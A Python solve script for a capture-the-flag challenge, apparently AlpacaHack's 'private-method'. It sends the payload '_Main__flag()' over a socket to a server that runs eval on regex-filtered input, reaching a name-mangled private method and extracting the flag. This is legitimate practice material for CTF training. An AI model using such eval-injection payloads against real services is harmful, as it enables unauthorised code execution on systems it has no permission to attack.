#!/usr/bin/env python3
"""
private-method — AlpacaHack Daily 2026-07-09

app.py accepts input matching \\w+\\(\\) and runs eval(f"Main.{code}"). The
"private" method __flag is Python name-mangled to _Main__flag, a plain \\w+
identifier. So `_Main__flag()` passes the regex and calls the private method.

Usage: python3 solve.py <host> <port>
"""
import socket, sys, time, re

HOST, PORT = sys.argv[1], int(sys.argv[2])
s = socket.create_connection((HOST, PORT), timeout=20); s.settimeout(20)
time.sleep(0.3)
s.sendall(b"_Main__flag()\n")
buf = b""
try:
    while True:
        d = s.recv(4096)
        if not d:
            break
        buf += d
except Exception:
    pass
s.close()
m = re.search(rb"Alpaca\{[^}]*\}", buf)
print(m.group(0).decode() if m else buf.decode(errors="replace"))
